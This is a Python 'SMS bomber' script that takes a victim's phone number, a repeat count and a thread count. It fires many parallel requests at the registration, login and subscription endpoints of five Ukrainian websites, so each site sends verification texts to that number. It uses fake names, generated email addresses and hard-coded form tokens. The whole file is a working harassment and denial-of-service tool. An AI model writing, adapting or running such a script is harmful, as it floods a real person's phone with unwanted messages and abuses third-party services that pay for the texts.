#!/usr/bin/python3

import requests
from threading import Thread
import random
import time
import sys

number = random.randint(1, 9999)
gmail = "sms.bomber"+ str(number) +"@gmail.com"
phone = sys.argv[1]
count = int(sys.argv[2])
thr = int(sys.argv[3])

def send_sms(number, gmail, phone, count):
	i = 0
	while i < count:
		i += 1
		try:
			allo = requests.post("https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA", 
				data={"firstname": "Dima",
				"telephone": "+38"+str(phone)
				,"email": str(gmail),
				"password": "password1"
				,"form_key": "PCrWtMVF1yvMsYjX",})

			print("'Allo' send message!")
		except:
			print("'Allo' didn't send message :(")

		try:
			videovhd =requests.post("http://videovhd.pw/functions.php", 
				data = {'input_number_subscribe_mtx':'38'+str(phone)})

			print("'VideovHD' send message!")
		except:
			print("'VideovHD' didn't send message :(")
		
		try:
			tarantino = requests.post("https://www.tarantino-family.com/wp-admin/admin-ajax.php", 
				data = {"action": "ajax_register_user", 
				"step":"1",
				"phone":"38"+str(phone), 
				"smscode":"",
				"security_login":"d2459dc7cd"})

			print("'tarantino-family' send message!")
		except:
			print("'tarantino-family' didn't send message :( ")

		try:
			eda_bond = requests.get("https://eda.bond.od.ua/cliententer//passwordsent/?phone=+38"+str(phone))

			print("'Eda Bond' send message!")
		except:
			print("'Eda Bond' didn't send message :(")

		try:
			box_catering = requests.post("https://box-catering.ua/login/phonecode/", 
				data = {"wa_auth_phone":"1",
				 "phone":"+38"+str(phone),
				  "code": ""})
			
			print("'Box-Catering' send message!")
		except:
			print("'Box-Catering' didn't send message :(") 
		
	print("Finished!")

def call():
	pass


def threads(thr):
	for item in range(thr):
		thread = Thread(target=send_sms, args= (number, gmail, phone, count))
		thread.start()

if __name__ == "__main__":
	threads(thr)
